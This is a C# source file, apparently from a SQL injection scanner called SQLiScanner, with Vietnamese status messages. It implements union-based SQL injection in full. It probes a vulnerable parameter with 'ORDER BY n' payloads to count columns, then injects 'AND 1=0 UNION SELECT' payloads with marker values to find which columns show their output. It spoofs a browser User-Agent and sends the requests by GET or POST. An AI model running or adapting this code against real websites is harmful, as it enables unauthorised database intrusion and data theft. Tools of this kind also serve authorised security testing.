using SQLiScanner.Models;
using SQLiScanner.Models.Enums;
using SQLiScanner.Utility;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Threading.Tasks;

namespace SQLiScanner.Modules
{
    public class UnionDetector
    {
        private readonly HttpClient _client;
        public UnionDetector(HttpClient client)
        {
            _client = client;
        }

        public async Task<int> GetColumnCountAsync(
            CrawlResult target, 
            DetectionResult detectedData, 
            PayloadState trackingState)
        {
            trackingState.UpdateStatus(ScanStatus.CheckingColumnCount, "Đang dò số cột bằng ORDER BY...");
            string originalValue = target.Params[detectedData.VulnerableParam];
            int baseLength = await GetResponseLengthAsync(target, detectedData.VulnerableParam, originalValue);

            if (baseLength <= 0) return -1;

            for (int i = 1; i <= 50; i++)
            {
                string payload = $"{originalValue}{detectedData.WorkingPrefix} ORDER BY {i}{detectedData.WorkingSuffix}";
                int currentLength = await GetResponseLengthAsync(target, detectedData.VulnerableParam, payload);

                bool isError = Math.Abs(currentLength - baseLength) > baseLength * 0.2;

                if (isError)
                {
                    if (i == 1) return -1;
                    return i - 1;
                }
                else
                {
                    trackingState.UpdateStatus(ScanStatus.CheckingColumnCount, $"Đang dò cột thứ {i}...");
                }
            }

            return -1;
        }

        public async Task<List<int>> GetVisibleColumnsAsync(
            CrawlResult target, 
            DetectionResult detectedData, 
            int colCount,
            PayloadState trackingState)
        {
            trackingState.UpdateStatus(ScanStatus.ExploitingData, $"Đang tìm cột Text trong {colCount} cột...");
            List<int> visibleCols = new List<int>();
            string fromTable = detectedData.DatabaseType == DatabaseType.Oracle ? " FROM DUAL" : "";
            string originalValue = target.Params[detectedData.VulnerableParam];

            string[] payloadParts = new string[colCount];
            for (int i = 0; i < colCount; i++)
            {
                trackingState.UpdateStatus(ScanStatus.ExploitingData, $"Đang thử inject cột {i + 1}/{colCount}...");
                for (int j = 0; j < colCount; j++) payloadParts[j] = "NULL";

                string magicTag = $"99{i + 1:D2}"; // VD: 9901
                payloadParts[i] = $"'{magicTag}'";

                string unionPart = string.Join(",", payloadParts);
                string payload = $"{originalValue}{detectedData.WorkingPrefix} AND 1=0 UNION SELECT {unionPart}{fromTable}{detectedData.WorkingSuffix}";

                try
                {
                    // Ở đây ta cần HTML string để tìm text '9901'
                    string? html = await SendPayloadGetStringAsync(target, detectedData.VulnerableParam, payload);

                    if (!string.IsNullOrEmpty(html) && html.Contains(magicTag))
                    {
                        visibleCols.Add(i + 1);
                    }
                }
                catch {}
            }

            return visibleCols;
        }

        #region Các hàm phụ trợ
        private async Task<int> GetResponseLengthAsync(CrawlResult target, string paramKey, string payloadValue)
        {
            try
            {
                byte[]? bytes = await SendPayloadGetBytesAsync(target, paramKey, payloadValue);
                return bytes == null ? -1 : bytes.Length;
            }
            catch { return -1; }
        }

        private async Task<byte[]?> SendPayloadGetBytesAsync(CrawlResult target, string paramKey, string payloadValue)
        {
            try
            {
                var finalParams = new Dictionary<string, string>(target.Params);
                finalParams[paramKey] = payloadValue;


                var method = new HttpMethod(target.HttpMethod.ToUpper());

                HttpRequestMessage request;

                if (method == HttpMethod.Get)
                {
                    var uriBuilder = new UriBuilder(target.FullUrl);
                    var query = System.Web.HttpUtility.ParseQueryString(string.Empty);
                    foreach (var p in finalParams) query[p.Key] = p.Value;
                    uriBuilder.Query = query.ToString();

                    request = new HttpRequestMessage(method, uriBuilder.ToString());
                }
                else
                {
                    request = new HttpRequestMessage(method, target.FullUrl);
                    request.Content = new FormUrlEncodedContent(finalParams);
                }

                if (!request.Headers.Contains("User-Agent"))
                {
                    request.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
                }

                using var response = await _client.SendAsync(request, HttpCompletionOption.ResponseContentRead);

                var bytes = await response.Content.ReadAsByteArrayAsync();

                return bytes;
            }
            catch 
            {
                return null;
            }
        }

        private async Task<string?> SendPayloadGetStringAsync(CrawlResult target, string paramKey, string payloadValue)
        {
            try
            {
                byte[]? bytes = await SendPayloadGetBytesAsync(target, paramKey, payloadValue);
                return bytes == null ? "" : System.Text.Encoding.UTF8.GetString(bytes);
            }
            catch { return ""; }
        }
        #endregion
    }
}